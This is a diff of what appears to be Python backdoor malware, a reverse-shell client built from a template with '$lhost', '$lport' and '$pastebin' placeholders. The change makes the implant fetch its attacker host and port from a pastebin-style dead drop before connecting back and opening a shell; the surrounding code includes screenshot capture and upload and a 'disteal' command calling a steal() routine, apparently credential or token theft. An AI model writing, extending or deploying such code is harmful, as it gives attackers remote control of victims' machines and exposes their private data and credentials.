@@ -439,7 +439,9 @@ def connection():
     while True:
         time.sleep(20)
         try:
-            s.connect(('$lhost', '$lport'))
+            cred = get('$pastebin')
+            sp = cred.text.split(':')
+            s.connect((sp[0], int(sp[1])))
             shell()
             s.close()
             break
@@ -491,8 +493,6 @@ def shell():
             except:
                 reliable_send('ERROR')
                 continue
-        elif command == 'back':
-            pass
         elif command[:10] == 'screenshot':
             screenshot()
             upload_file(appd+'\\screen.png')
@@ -585,6 +585,8 @@ def shell():
             except:
                 reliable_send('[-] ERROR')
                 continue
+        elif command == 'back':
+            pass
         elif command[:7] == 'disteal':
             try:
                 steal()
